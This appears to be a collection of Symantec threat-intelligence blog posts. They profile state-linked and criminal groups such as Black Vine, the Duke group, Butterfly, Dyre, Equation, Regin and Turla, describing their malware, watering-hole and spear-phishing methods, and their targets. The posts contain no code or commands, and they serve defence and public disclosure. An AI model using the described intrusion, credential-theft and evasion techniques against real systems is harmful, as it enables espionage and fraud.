    "text": "Earlier this year, the second-largest health insurance provider in the US publicly disclosed that it had been the victim of a major cyberattack. The attack against Anthem resulted in the largest known healthcare data breach to date, with80 million patient records exposed. Symantec believes that the attackers behind the Anthem breach are part of a highly resourceful cyberespionage group called Black Vine. The Anthem attack is only one of multiple campaigns that Symantec has attributed to this group. Symantec’slatest whitepaperdocuments multiple Black Vine operations that have been occurring since 2012. Black Vine’s targets include gas turbine manufacturers, large aerospace and aviation companies, healthcare providers, and more. The group has access to zero-day exploits, most likely obtained through theElderwood framework, and uses custom-developed back door malware. By connecting multiple Black Vine campaigns, we traced how the attack group has evolved over the last three years. Black Vine’s attacks to date delivered exploits for the following zero-day vulnerabilities, primarily through watering-hole attacks: In its campaigns, Black Vine compromised legitimate websites that were of interest to its targets in order to serve exploits to the sites’ visitors. If the zero-day exploits successfully worked against the vulnerable software on the victim’s computer, then they dropped Black Vine’s custom malware, providing the attackers with remote access to the computer. In addition to watering-hole attacks, Black Vine also sent spear-phishing emails that disguised its threats using technology-themed lures. Black Vine has compromised companies in the following industries: The vast majority of Black Vine malware infections were located in the US, followed by China, Canada, Italy, Denmark, and India. Symantec observed Black Vine using three types of custom malware throughout its campaigns: Hurix and Sakurel (both detected as Trojan. Sakurel), and Mivast (detected as Backdoor. Mivast). All three threats can perform the following actions: Our analysis suggests that Black Vine is well resourced, as the group is capable of frequently updating and modifying its malware to avoid detection. During our analysis, we noticed that Black Vine used certain zero-day exploits at the same time that other attack groups used them. The other campaigns have been previously investigated by Symantec, such asone by Hidden Lynx. While these campaigns included the same zero-day exploits, they delivered different payloads unique to each attack group. The fact that these different adversaries simultaneously used the same exploits suggests that they all have access to a common zero-day exploit distribution framework. Symantec has previously identified the framework in question as the Elderwood platform. We first researched the platform in 2012 and observed how it has been continuously updated with the latest zero-day exploits ever since. In 2014, we discovered thatseveral attack groups were likely using the Elderwood framework, rather than just one. All of the campaigns that leveraged Elderwood’s zero-day exploits have been attributed to attackers based in China. Other reports suggestthat some of the actors involved in Black Vine’s activity may have had connections with a Beijing-based IT security firm called Topsec. Black Vine is a formidable, highly resourced attack group which is equipped to conduct cyberespionage against targeted organizations. Based on our records of its past campaigns, Symantec believes that Black Vine’s malicious activity will continue. We hope that our whitepaper will allow organizations to better understand the risk that this attack group poses, helping them to develop stronger defenses for their sensitive information. Symantec has the following detections in place to protect against Black Vine’s malware: Intrusion prevention system For a complete account of Symantec’s investigation into Black Vine and its campaigns,please read our whitepaper.

    "text": "Symantec has uncovered an elusive Trojan used by the cyberespionage group behind the “Duke” family of malware. Seaduke (detected by Symantec as Trojan. Seaduke) is a low-profile information-stealing Trojan which appears to be reserved for attacks against a small number of high-value targets. Seaduke has been used in attacks against a number of major, government-level targets. The malware hides behind numerous layers of encryption and obfuscation and is capable of quietly stealing and exfiltrating sensitive information such as email from the victim’s computer. Seaduke has a highly configurable framework and Symantec has already found hundreds of different configurations on compromised networks. Its creators are likely to have spent a considerable amount of time and resources in preparing these attacks and the malware has been deployed against a number of high-level government targets. While the Duke group began to distribute Cozyduke in an increasingly aggressive manner, Seaduke installations were reserved only for select targets. Seaduke victims are generally first infected with Cozyduke and, if the computer appears to be a target of interest, the operators will install Seaduke. The group behind Seaduke is a cyberespionage operation that is responsible for a series of attacks against high-profile individuals and organizations in government, international policy and private research in the United States and Europe. It has a range of malware tools at its disposal, known as the Dukes, including Cozyduke (Trojan. Cozer), Miniduke (Backdoor. Miniduke) and Cosmicduke (Backdoor. Tinybaron). News of the Duke group first emerged in March and April of 2015, when reports detailing attacks involving a sophisticated threat actor variously called Office Monkeys,EuroAPT,Cozy Bear, andCozydukewere published. Symantec believes that this group has a history of compromising governmental and diplomatic organizations since at least 2010. The group began its current campaign as early as March 2014, when Trojan. Cozer (aka Cozyduke) was identified on the network of a private research institute in Washington, D. C. In the months that followed, the Duke group began to target victims with “Office Monkeys”- and “eFax”-themed emails, booby-trapped with a Cozyduke payload. These tactics were atypical of a cyberespionage group. It’s quite likely these themes were deliberately chosen to act as a smokescreen, hiding the true intent of the adversary. The Duke group has mounted an extended campaign targeting high-profile networks over extended periods, something which is far beyond the reach of the majority of threat actors. Its capabilities include: Although Cozyduke activity was first identified in March 2014, it wasn’t until July that the group managed to successfully compromise high-profile government networks. Cozyduke was used throughout these attacks to harvest and exfiltrate sensitive information to the attackers. In parallel, the Duke group was also installing separate malware onto these networks, namely Backdoor. Miniduke and the more elusive Trojan. Seaduke. It could use these payloads to exploit networks on multiple fronts and providing it with additional persistence mechanisms. In July of 2014, the group instructed Cozyduke-infected computers to install Backdoor. Miniduke onto a compromised network. Miniduke has been the group’s tool of choice for a number of years in espionage operations predominantly targeting government and diplomatic entities in Eastern Europe and ex-Soviet states. “Nemesis Gemina” appears to be the internal name for the framework used by the group to identify the project, previously reported byKaspersky. The following debug string was present in the sample used in these attacks: This project name has been seen in Backdoor. Tinybaron (aka Cosmicduke) samples, which Symantec also attributes to the Duke group. This deployment of Miniduke and the technical similarities with Cozyduke provided strong indicators as to who was behind the attacks. These attacks were already well underway when another group began to deploy a previously unknown piece of malware. In October 2014, the Seaduke payload began to appear within target networks. Although Seaduke was developed in Python, the overall framework bears a striking resemblance to Cozyduke in terms of operation. It’s unclear why the attackers waited until October to deploy Seaduke. Was it reserved for a more specific attack? Was part of their cover blown, necessitating the use of an alternative framework? The Seaduke framework was designed to be highly configurable. Hundreds of reconfigurations were identified on compromised networks. The communication protocol employed had many layers of encryption and obfuscation, using over 200 compromised web servers for command and control. Seaduke required a significant investment of time and resources in the preparatory and operational phases of the attack. The attackers control Cozyduke via compromised websites, issuing instructions to infected machines by uploading “tasks” to a database file. Cozyduke will periodically contact these websites to retrieve task information to be executed on the local machine. One such task (an encoded PowerShell script) instructed Cozyduke to download and execute Seaduke from a compromised website. The attackers can operate Seaduke in a broadly similar fashion to Cozyduke. The Seaduke control infrastructure is essentially distinct, opening up the possibility of sub-teams concurrently exploiting the target network. Unlike Cozyduke, Seaduke operators upload “task” files directly to the command-and-control (C&C) server; there is no database as such present. Seaduke securely communicates with the C&C server over HTTP/HTTPS beneath layers of encoding (Base64) and encryption (RC4, AES). To an untrained eye, the communications look fairly benign, no doubt an effort to stay under the radar on compromised networks. Seaduke has many inbuilt commands which are available to the attackers. They have the ability to retrieve detailed bot/system information, update bot configuration, upload files, download files, and self-delete the malware from the system. The self-delete function is interestingly called “seppuku”. This is a form of Japanese ritual suicide. The attackers have also developed a number of additional payloads. Operators can push these payloads onto infected machines for very specific attacks. The Duke group has brought its operational capability to the next level. Its attacks have been so bold and aggressive, that a huge amount of attention has been drawn to it, yet it appears to be unperturbed. Its success at compromising such high-profile targets has no doubt added a few feathers to its cap. Even the developers reveled in this fact, naming one of Seaduke’s functions “forkmeiamfamous”. While the group is currently keeping a lower profile, there’s no doubt it will reappear. Some tools may have to be abandoned, some reworked and others built completely from scratch. This attack group is in it for the long haul.

    "text": "Note:“Morpho” was used in the original publication to refer to this attack group. Symantec has renamed the group “Butterfly” to avoid any link whatsoever to other legitimate corporate entities named “Morpho” A corporate espionage group has compromised a string of major corporations over the past three years in order to steal confidential information and intellectual property. The gang, which Symantec calls Butterfly, is not-state sponsored, rather financially motivated. It has attacked multi-billion dollar companies operating in the internet, IT software, pharmaceutical, and commodities sectors. Twitter, Facebook, Apple, and Microsoft are among the companies who have publicly acknowledged attacks. Butterfly is technically proficient and well resourced. The group has developed a suite of custom malware tools capable of attacking both Windows and Apple computers, and appears to have used at least one zero-day vulnerability in its attacks. It keeps a low profile and maintains good operational security. After successfully compromising a target organization, it cleans up after itself before moving on to its next target. This group operates at a much higher level than the average cybercrime gang. It is not interested in stealing credit card details or customer databases and is instead focused on high-level corporate information. Butterfly may be selling this information to the highest bidder or may be operating as hackers for hire. Stolen information could also be used for insider-trading purposes. The first signs of Butterfly’s activities emerged in early 2013 when several major technology and internet firms were compromised. Twitter,Facebook,Appleand Microsoft disclosed that they had been compromised by very similar attacks. The attackers attacked victims by compromising a website used by mobile developers and using a Java zero-day exploit to infect them with malware. The malware used in these attacks was a Mac OS X back door known as OSX. Pintsized. Subsequent analysis by security researcher Eric Romang identified a Windows back door, Backdoor. Jiripbot, which was also used in the attacks. Following this flurry of publicity, the Butterfly group slipped back into the shadows. However, an investigation by Symantec has found that the group has been active since at least March 2012 and its attacks have not only continued to the present day, but have also increased in number. Symantec has to date discovered 49 different organizations in more than 20 countries that have been attacked by Butterfly. Over time, a picture has emerged of a cybercrime gang systematically targeting large corporations in order to steal confidential data. Aside from the four companies which have publicly acknowledged attacks, Symantec has identified five other large technology firms compromised by Butterfly, primarily headquartered in the US. However, technology is not the only sector the group has focused on and Symantec has found evidence that Butterfly has attacked three major European pharmaceutical firms. In the first attack, the attackers gained a foothold by first attacking a small European office belonging to one firm and using this infection to then move on to its US office and European headquarters. This template appeared to be followed in the two subsequent attacks on big pharma firms, with Butterfly compromising computers in a number of regional offices before being discovered. Butterfly has also shown an interest in the commodities sector, attacking two major companies involved in gold and oil in late 2014. In addition to this, the Central Asian offices of a global law firm were compromised in June 2015. The company specializes in finance and natural resources specific to that region. The latter was one of at least three law firms the group has targeted over the past three years. Butterfly appears to have a good working knowledge of the organizations it is attacking and is focused on stealing specific kinds of information. In many attacks, the group has succeeded in compromising Microsoft Exchange or Lotus Domino email servers in order to intercept company emails and possibly use them to send counterfeit emails. The group has also attacked enterprise content management systems, which would often be home to legal and policy documents, financial records, product descriptions, and training documents. In some instances, the group has zoned in on specialist systems. For example, one attack saw it gain access to a Physical Security Information Management (PSIM) system, which is used for managing and monitoring physical security systems, including swipe card access. This could have provided the attackers with access to CCTV feeds, allowing them to track the movement of people around buildings. Butterfly has a number of malware tools at its disposal, all of which appear to be internally developed. Each tool is well documented, indicating that a group rather than an individual is responsible for the attacks. Its primary tools are two back door Trojans. OSX. Pintsized is capable of opening a back door on Mac OS X computers. Its Windows counterpart is Backdoor. Jiripbot, which has shown signs of continuous development over the past two years, with various minor features being removed or added. Butterfly has also developed a number of its own hacking tools. Hacktool. Securetunnel is a modified version of OpenSSH which contains additional code to pass a command-and-control (C&C) server address and port to a compromised computer. Hacktool. Bannerjack is meanwhile used to retrieve default messages issued by Telnet, HTTP, and generic Transmission Control Protocol (TCP) servers. Symantec believes it is used to locate any potentially vulnerable servers on the local network, likely including printers, routers, HTTP servers, and any other generic TCP server. Butterfly uses Hacktool. Multipurpose to help it move across a compromised networking by editing event logs to hide activity, dumping passwords, securely deleting files, encrypting files, and carrying out basic network enumeration. The group uses Hacktool. Eventlog to parse event logs, dumping out ones of interest, and delete entries. It also kills processes and performs a secure self-delete. Hacktool. Proxy. A is used to create a proxy connection that allows attackers to route traffic through an intermediary node, onto their destination node. Based on the profile of the victims and the type of information targeted by the attackers, Symantec believes that Butterfly is financially motivated, stealing information it can potentially profit from. The group appears to be agnostic about the nationality of its targets, leading us to believe that Butterfly is unaffiliated to any nation state. The group’s malware is documented in fluent English, indicating that some of the group members, if not all, can speak the language. They also display some knowledge of English-speaking pop culture, such as using the meme AYBABTU (All your base are belong to us) as an encryption key in Backdoor. Jiripbot. Command-and-control server activity is highest at times that correspond to the US working day, which may suggest some or all of the group are operating in this region. However, this could also be accounted for by the fact that many of the group’s victims are located in the US. Butterfly may profit from its attacks in a number of ways. The group may be operating as “hackers for hire”, targeting corporations on request. Alternatively, it may select its own targets and either sell stolen information to the highest bidder or use it for insider-trading purposes. Butterfly is a disciplined, technically capable group with a high level of operational security. Having managed to increase its level of activity over the past three years while maintaining a low profile, the group poses a threat that ought to be taken seriously by corporations.

    "text": "The Dyre financial Trojan has emerged over the past year to become one of the most potent financial fraud tools in operation. Dyre is configured to defraud the customers of more than 1,000 banks and other companies worldwide. Consumers in English-speaking countries, in particular the US and UK, are most at risk, since this is where the largest numbers of targeted banks are located. After a number of recent takedowns against major financial threats such as Gameover Zeus, Shylock, and Ramnit, the threat posed by these groups has receded but Dyre has taken their place as one of the main threats to ordinary consumers. Detected by Symantec as Infostealer. Dyre, Dyre targets Windows computers and can steal banking and other credentials by attacking all three major web browsers (Internet Explorer, Chrome, and Firefox). Dyre is a two-pronged threat. Aside from stealing credentials, it can also be used to infect victims with other types of malware, such as adding them to spam botnets. A year of growthAs outlined in a newtechnical paperfrom Symantec Security Response published today, the number of Dyre infections began to surge a year ago and the attackers behind this malware have steadily improved its capabilities and continued to build out supporting infrastructure. Dyre is mainly spread using spam emails. In most cases, the emails masquerade as businesses documents, voicemail, or fax messages. If the victim clicks on an email’s attachment, they are redirected to a malicious website which will install the Upatre downloader on their computer (detected by Symantec as Downloader. Upatre). Upatre is one of the most popular reconnaissance/downloader tools used by financial fraud groups and has previously been employed by the Gameover Zeus and Cryptolocker gangs. Upatre acts as a bridgehead on the victim’s computer, collecting information about it, attempting to disable security software, and finally downloading and installing the Dyre Trojan. Dyre is capable of using several different types of man-in-the-browser (MITB) attacks against the victim’s web browser to steal credentials. One MITB attack involves scanning every web page visited and checking it against a list of sites that Dyre is pre-configured to attack. If a match is found, it redirects the victim to a fake website that looks similar to its genuine counterpart. This fake website will harvest the victim’s credentials before redirecting back to the genuine website. A second MITB attack allows Dyre to alter the way legitimate websites are displayed in the browser window by adding malicious code to it to steal the victim’s login credentials. In some scenarios, Dyre may also display an additional fake page informing the victim that their computer has not been recognized and that additional credentials need to be provided to verify their identity, such as their date of birth, PIN code, and credit card details. Dyre is also used to infect victims with further malware and Symantec has to date seen seven other malware families being pushed out to infected computers. In many cases, the victim is added to a botnet, which is then used to power further spam campaigns and infect more victims. Based on the times at which the Dyre attackers are most active, Symantec believes that the group is likely based in Eastern Europe or Russia. A large amount of the group’s command-and-control (C&C) infrastructure is located in these regions, but a relatively low number of infections occur in these countries. It is possible that the group may be attempting to keep a low profile by avoiding targets close to home. Symantec and Norton products detect these threats as: Other threats distributed by the Dyre Trojan are detected as: For detailed technical analysis and indicators of compromise, please read our whitepaperDyre: Emerging threat on financial fraud landscape.

    "text": "Duqu 2.0, the cyberespionage tool that was used to compromise security firm Kaspersky Lab, has also been used in a number of other attack campaigns against a range of targets, including several telecoms firms. Analysis by Symantec concurs withKaspersky’s assessment todaythat Duqu 2.0 (detected by Symantec as W32. Duqu. B) is an evolution of the older Duqu worm, which wasused in a number of intelligence-gathering attacks against a range of industrial targets before it was exposed in 2011. Although their functionalities were different, the original Duqu worm had many similarities with the Stuxnet worm used to sabotage the Iranian nuclear development program. Symantec has found evidence that Duqu has been used in a number of different attack campaigns against a small number of selected targets. Among the organizations targeted were a European telecoms operator, a North African telecoms operator, and a South East Asian electronic equipment manufacturer. Infections were also found on computers located in the US, UK, Sweden, India, and Hong Kong. In addition to the attack against itself, Kaspersky believes Duqu was used to target countries involved in international negotiations surrounding Iran’s nuclear program. Given the diversity of targets, Symantec believes that the Duqu attackers have been involved in multiple cyberespionage campaigns. Some organizations may not be the ultimate targets of the group’s operations, but rather stepping stones towards the final target. The group’s interest in telecoms operators could be related to attempts to monitor communications by individuals using their networks. Symantec has found no evidence to suggest that it has been affected by attacks using this malware. This new version of Duqu is stealthy and resides solely in the computer’s memory, with no files written to disk. It comes in two variants. The first is a basic back door that appears to be used to gain a persistent foothold inside the targeted entity by infecting multiple computers. The second variant is more complex. It has the same structure as the first, but contains several modules that provide a range of functionality to the malware, such as gathering information on the infected computer, stealing data, network discovery, network infection, and communication with command-and-control (C&C) servers. This variant appears to be deployed to computers deemed to be targets of interest by the attackers. Duqu and Duqu 2.0 share large amounts of code, in addition to similarities in how that code is organized. The shared code includes a number of helper functions. For example, as shown in Figure 1, there is a “gen_random” function (as labelled by an engineer) that is shared between Duqu and Duqu 2.0. Not only is that gen_random code shared, but the code that calls that function is also organized almost identically. Such similarities in how code is called is repeated in several other locations throughout Duqu 2.0, including in how C&C IP addresses are formatted, how network messages are generated, and how files are encrypted and decrypted. When a program needs to store data, the program author will design structures to store that data in a logical and easily accessible manner. Duqu and Duqu 2.0 share a number of these data structures. Another shared feature between the two variants, as shown in Figure 1, is the use of a cookie header with a hardcoded string and a random string when sending messages to a C&C server. For example: A second shared feature in the network communications code is to connect to a number of Microsoft URLs to retrieve a proxy address, as shown in Figure 2. The list of Microsoft URLs connected to, by both variants, is identical. Finally, for network communications, when Duqu uses HTTP, it will use image names in the “Content-Disposition” header. For Duqu, the value “DSC00001.jpg” was used, whereas for Duqu 2.0, the value “%05d.gif” is used. Based on our analysis, Symantec believes that Duqu 2.0 is an evolution of the original threat, created by the same group of attackers. Duqu 2.0 is a fully featured information-stealing tool that is designed to maintain a long term, low profile presence on the target’s network. Its creators have likely used it as one of their main tools in multiple intelligence gathering campaigns. Given that activity surrounding the original version of Duqu dropped off following its discovery, it is likely that the group may now retreat before re-emerging with new malware.

    "text": "An adept and well-resourced cyberespionage group known as Equation has been targeting organizations in a number of countries with a range of highly developed malware tools that go to great lengths to evade detection. New research from our peers at Kaspersky Lab has brought the group’s activities and tools to public attention. Symantec products detect the malware currently known to be used by Equation. The Equation group has used a range of different malware tools to mount its operations. Targeted computers are often compromised initially with malware that acts as a reconnaissance tool, gathering information about the infected computer and keeping a back door open, allowing for the installation of further malware if the computer is identified as something of interest. This is a common tactic adopted by cyberespionage groups. For example, the group behind the Turla Trojanusually initially infects its victims with the Wipbot Trojan before infecting them with Trojan Turla if it decides the computer is worthy of interest. The main tool used for this purpose appears to be Infostealer. Micstus, which is also known as “DoubleFantasy”. Trojan. Tripfant (also known as “TripleFantasy”) has similar capabilities and may be a replacement for Micstus. Equation has used a succession of advanced, multipurpose Trojans as its main malware tools. Trojan. Grayphish, which is also known as “GrayFish”, is believed to be the group’s current weapon of choice. It has a complex structure and stealthy characteristics. Grayphish includes a bootkit which allows the malware to take control of the entire Windows boot process. Highly stealthy, Grayphish uses an encrypted virtual file system hidden inside the Windows registry. This appears to have replaced the older Trojan. Equdrug (also known as “EquationDrug”) which was favored until recently. Equdrug in turn appears to have replaced the older Backdoor. Lassrv. B. Also known as “EquationLaser”, this Trojan seems to be one of the early workhorses used by the group until it was phased out. Grayphish and Equdrug have a modular structure. Aside from standard modules, a number of specialized features can also be employed. Among this is a highly sophisticated and rarely used module that allows the malware to reprogram the firmware on a range of popular hard disks, providing the attackers with a persistent presence that can survive disk reformatting. Symantec detects this module as Packed. Generic.483. In addition to these powerful Trojans, Equation has employed a number of specialist tools. Among these are Trojan. Grokey a custom keylogger (also known as “Grok”) and W32. Fanni, which is also known as “Fanny worm”. This worm’s chief purpose appears to be the targeting of air-gapped networks. It can receive commands and exfiltrate data through infected USB sticks. Fanny used two zero day exploits that were also used in the Stuxnet attacks. The exploits were used in Fanny prior to Stuxnet indicating that Equation had prior knowledge of the vulnerabilities. Another similarity lies in the fact that Stuxnet was also designed to attack air-gapped networks. ProtectionSymantec and Norton products have the following detections in place against malware used by the Equation group: Prior to this, Symantec detected Equation malware with a range of detections including Trojan. Tracur, Backdoor. Trojan, Trojan Horse, Trojan. Gen.2, and W32. Stration@mm.

    "text": "Symantec has been tracking the activities of the Carbanak cybercrime group for some time and our customers are protected against the malware used by this group. Carbanak, which has been the subject of media reports over the past 24 hours, is an atypical financial crime group, focused on defrauding banks rather than their customers. Symantec calls the group Silicon, but other vendors refer to it as Carbanak or Anunak. The main piece of malware that has recently been used by the group is Trojan. Carberp. B, which contains code borrowed from the older Trojan. Carberp. The group is believed to have targeted up to 100 banks and other financial institutions in multiple countries. The exact amount stolen by the Carbanak group is unknown, but estimates range from tens of millions of US dollars up to $1 billion. Carbanak is a skilled group of attackers, capable of gaining a foothold on the networks of targeted banks through malware hidden in spear-phishing emails. Once inside, the group patiently and stealthily moves across the network of a bank, gathering intelligence and compromising enough computers until it has the resources and intelligence to launch a successful attack. Carbanak has employed two main tactics to cash out. In some cases, it has transferred funds to accounts controlled by the attackers and operated by money mules. In other instances, it has compromised ATMs, hijacking them in order to dispense funds to people working for the group. Carbanak is not the first group to target ATMs. For example, research by Symantec found that attackers using Backdoor. Ploutus. B were able to compromise ATMs andempty them of cash by simply sending an SMS to the ATM. Financial institutions have been fighting malware for more than ten years, and the financial industry was the most attacked sector with 29 percent of all spear-phishing attacks in January 2015. Attackers who are motivated by financial reward quickly adapt to countermeasures, and many security implementations are ineffective at protecting against advanced attacks. It’s imperative that organizations implement layered security measures to protect against today’s advanced threats and educate employees about security policies and best practices.

    "text": "Backdoor. Destover, the destructive malware that was the subject of an FBI Flash Warning this week, shares several links to earlier attacks directed at targets in South Korea. Some samples of Destover report to a command-and-control (C&C) server that was also used by a version of Trojan. Volgmer crafted to attack South Korean targets. The shared C&C indicates that the same group may be behind both attacks. Volgmer is a targeted piece of malware, likely used by a single group, which has been used in limited attacks, possibly as a first stage reconnaissance tool. It can be used to gather system information and download further files for execution. Significantly, the version of Volgmer which shares a C&C with Destover was configured specifically to attack South Korean targets and will only run on Korean computers. Destover also share some techniques and component names with theJokra attacks against South Korea in 2013. However there is no hard evidence as yet to link the attacks and a copycat operation can’t be ruled out. Links also exist to theShamoon Attacks, with both attackers using the same, commercially available drivers. However, in this instance it appears highly unlikely that the same group was behind both attacks and instead it would appear that the Destover attacks copied techniques from Shamoon. Destover is a particularly damaging form of malware that is capable of completely wiping an infected computer. It was the subject of an FBI Flash Warning earlier this week after at least one variant of it was understood to have been used in a high profile attack. There are several malicious files associated with the FBI Destover report: Diskpartmg16.exe is the first file that is created on an infected computer and, when executed, it creates the files net_ver.dat and igfxtrayex.exe. When “diskpartmg16.exe” is run, it connects to a number of specific IP addresses within a set IP range, as well as computer names in the format “USSDIX[Machine Name]”. This indicates that this variant of Destover was not intended to be indiscriminate and the malware had instead been configured to only attack computers belonging to one particular organization. The destructive payload of Destover is carried by igfxtrayex.exe. In certain instances, when run, it will: Iissvr.exe, meanwhile, is a backdoor which listens on port 80. Once an attacker communicates with the compromised computer, this file displays a message, which reads: Some samples of Destover seen by Symantec link to a C&C server that has been used by variants of Trojan. Volgmer in the past. Symantec has been tracking Trojan. Volgmer for several months. Volgmer is a threat capable of opening a back door on an infected computer, which allows the malware to communicate with a C&C server to retrieve system information, execute commands, upload files, and download files for execution. Interestingly, the variants of Volgmer that share a C&C server with Destover are configured to end execution if the compromised computer’s region is not “Korea”. The Destover attackers use techniques and components, such as file names, that are similar to those used in theJokra attacks against South Korea in 2013. These attacks crippled servers belonging to several South Korean banks and broadcasting organizations and also defaced the website of a Korean telecoms firm. The malware used in the Jokra attacks contained code that did not begin wiping the hard drive until a set time period expired. Destover is also configured to perform a delayed wipe. Furthermore,media outlets in South Korea have reported that a number of similar file names were used in both attacks(Korean language link). Destover also share some commonalities with theShamoon Attacks. Both Destover and the malware used by the Shamoon attackers (W32. Disttrack) share some drivers. These are not malicious files and are commercially available drivers. While both Destover and Disttrack are destructive forms of malware, there is no evidence to suggest that the same group is behind both attacks.

    "text": "An advanced piece of malware, known as Regin, has been used in systematic spying campaigns against a range of international targets since at least 2008. A back door-type Trojan, Regin is a complex piece of malware whose structure displays a degree of technical competence rarely seen. Customizable with an extensive range of capabilities depending on the target, it provides its controllers with a powerful framework for mass surveillance and has been used in spying operations against government organizations, infrastructure operators, businesses, researchers, and private individuals. It is likely that its development took months, if not years, to complete and its authors have gone to great lengths to cover its tracks. Its capabilities and the level of resources behind Regin indicate that it is one of the main cyberespionage tools used by a nation state. As outlined in a new technical whitepaper from Symantec, Backdoor. Regin is a multi-staged threat and each stage is hidden and encrypted, with the exception of the first stage. Executing the first stage starts a domino chain of decryption and loading of each subsequent stage for a total of five stages. Each individual stage provides little information on the complete package. Only by acquiring all five stages is it possible to analyze and understand the threat. Regin also uses a modular approach, allowing it to load custom features tailored to the target. This modular approach has been seen in other sophisticated malware families such as Flamer and Weevil (The Mask), while the multi-stage loading architecture is similar to that seen in the Duqu/Stuxnet family of threats. Regin infections have been observed in a variety of organizations between 2008 and 2011, after which it was abruptly withdrawn. A new version of the malware resurfaced from 2013 onwards. Targets include private companies, government entities and research institutes. Almost half of all infections targeted private individuals and small businesses. Attacks on telecoms companies appear to be designed to gain access to calls being routed through their infrastructure. Infections are also geographically diverse, having been identified in mainly in ten different countries. The infection vector varies among targets and no reproducible vector had been found at the time of writing. Symantec believes that some targets may be tricked into visiting spoofed versions of well-known websites and the threat may be installed through a Web browser or by exploiting an application. On one computer, log files showed that Regin originated from Yahoo! Instant Messenger through an unconfirmed exploit. Regin uses a modular approach, giving flexibility to the threat operators as they can load custom features tailored to individual targets when required. Some custom payloads are very advanced and exhibit a high degree of expertise in specialist sectors, further evidence of the level of resources available to Regin’s authors. There are dozens of Regin payloads. The threat’s standard capabilities include several Remote Access Trojan (RAT) features, such as capturing screenshots, taking control of the mouse’s point-and-click functions, stealing passwords, monitoring network traffic, and recovering deleted files. More specific and advanced payload modules were also discovered, such as a Microsoft IIS web server traffic monitor and a traffic sniffer of the administration of mobile telephone base station controllers. Regin’s developers put considerable effort into making it highly inconspicuous. Its low key nature means it can potentially be used in espionage campaigns lasting several years. Even when its presence is detected, it is very difficult to ascertain what it is doing. Symantec was only able to analyze the payloads after it decrypted sample files. It has several “stealth” features. These include anti-forensics capabilities, a custom-built encrypted virtual file system (EVFS), and alternative encryption in the form of a variant of RC5, which isn’t commonly used. Regin uses multiple sophisticated means to covertly communicate with the attacker including via ICMP/ping, embedding commands in HTTP cookies, and custom TCP and UDP protocols. Regin is a highly-complex threat which has been used in systematic data collection or intelligence gathering campaigns. The development and operation of this malware would have required a significant investment of time and resources, indicating that a nation state is responsible. Its design makes it highly suited for persistent, long term surveillance operations against targets. The discovery of Regin highlights how significant investments continue to be made into the development of tools for use in intelligence gathering. Symantec believes that many components of Regin remain undiscovered and additional functionality and versions may exist. Additional analysis continues and Symantec will post any updates on future discoveries Indicators of compromise for security administrators and more detailed and technical information can be found in our technical paper -Regin: Top-tier espionage tool enables stealthy surveillance Symantec and Norton products detect this threat as Backdoor.

    "text": "A cyberespionage campaign involving malware known as Wipbot and Turla has systematically targeted the governments and embassies of a number of former Eastern Bloc countries. Trojan. Wipbot (known by other vendors as Tavdig) is a back door used to facilitate reconnaissance operations before the attackers shift to long term monitoring operations using Trojan. Turla (which is known by other vendors as Uroboros, Snake, and Carbon). It appears that this combination of malware has been used for classic espionage-type operations for at least four years. Because of the targets chosen and the advanced nature of the malware used, Symantec believes that a state-sponsored group was behind these attacks. Turla provides the attacker with powerful spying capabilities. Configured to start every time a computer starts, once the user opens a Web browser it opens a back door that enables communication with the attackers. Through this back door, the attackers can copy files from the infected computer, connect to servers, delete files, and load and execute other forms of malware, among other capabilities. The group behind Turla has a two-pronged attack strategy that involves infecting victims through spear phishing emails and watering hole attacks. The watering hole attacks display competent compromise capabilities, with the attackers compromising a range of legitimate websites and only delivering malware to victims visiting from pre-selected IP address ranges. These compromised websites deliver a payload of Trojan. Wipbot. It is highly likely that Wipbot is then used as a downloader to deliver Turla to the victim. While infections initially appeared to be spread over a range of European countries, closer analysis revealed that many infections in Western Europe occurred on computers that were connected to private government networks of former Eastern Bloc countries. These infections appear to have transpired in the embassies of these countries. Analysis of infections revealed that the attackers were heavily focused on a small number of countries. For example, in May of 2012, the office of the prime minister of a former Soviet Union member country was infected. This infection spread rapidly and up to 60 computers at the prime minister’s office were compromised. Another attack saw a computer at the embassy to France of a second former Soviet Union member infected in late 2012. During 2013, infections began to spread to other computers linked to the network of this country’s ministry of foreign affairs. In addition, its ministry of internal affairs was also infected. Further investigation uncovered a systematic spying campaign targeted at its diplomatic service. Infections were discovered at embassies in Belgium, Ukraine, China, Jordan, Greece, Kazakhstan, Armenia, Poland, and Germany. At least five other countries in the region were targeted by similar attacks. While the attackers have largely focused on the former Eastern Bloc, a number of other targets were also found. These included the ministry for health of a Western European country, the ministry for education of a Central American country, a state electrical authority in the Middle East, and a medical organization in the US. Prior to publication, Symantec notified all relevant national authorities, such as Computer Emergency Response Centers (CERTs) that handle and respond to Internet security incidents. The group behind Turla uses spear phishing emails and watering hole attacks to infect victims. Some of the spear phishing emails purported to come from a military attaché at a Middle Eastern embassy and had an attachment masquerading as the minutes of meetings. Opening the attachment resulted in Trojan. Wipbot being dropped on to the victim’s computer. It is believed that Wipbot may be the delivery mechanism for Turla as they share several similarities in code and structure. Since September 2012, the group has compromised at least 84 legitimate websites to facilitate watering hole attacks. Websites owned by a number of different governments and international agencies were among those compromised by the attackers. Visitors to these sites were being redirected to Web servers where a ‘fingerprinting’ script was executed. This script collected some identifying information about the visitor’s computer. This phase of the campaign appeared to serve as an intelligence trawl, gathering information about what browsers and plugins website visitors were using, which would help identify which exploits would work best against them. The next phase of the operation was highly targeted, with servers then configured to drop Wipbot only to IP addresses associated with intended targets. In one instance, the malware delivered was disguised as a Shockwave installer bundle. Wipbot was then used to gather further information about the infected computer. If the attackers deemed the victim of interest, it appears likely that a second back door (Trojan. Turla) with far greater capabilities was downloaded on to the victim’s computer. Wipbot appears to act as a reconnaissance tool, while Turla is used to maintain a long term presence on the victim’s computer. Analysis conducted by Symantec has found several technical connections between Wipbot and Turla which indicates the same group or larger organization wrote both pieces of code. Symantec has been tracking the activities of the group behind Turla for a number of years. The identity of the attackers has yet to be established, although timestamps from activity associated with the attacks indicate that most activity occurs during the standard working day of the UTC +4 time zone. Turla is an evolution of an older piece of malware, Trojan. Minit, which has been in operation since 2004. The current campaign is the work of a well-resourced and technically competent attack group that is capable of penetrating many network defenses. It is focused on targets that would be of interest to a nation state, with spying and theft of sensitive data among its objectives. Symantec has the following detection in place for the malware used in these attacks: Update – January 22, 2015:Symantec Security Response has published a whitepaper containing more information about the attack group behind this campaign and detailed indicators of compromise for the malware involved.

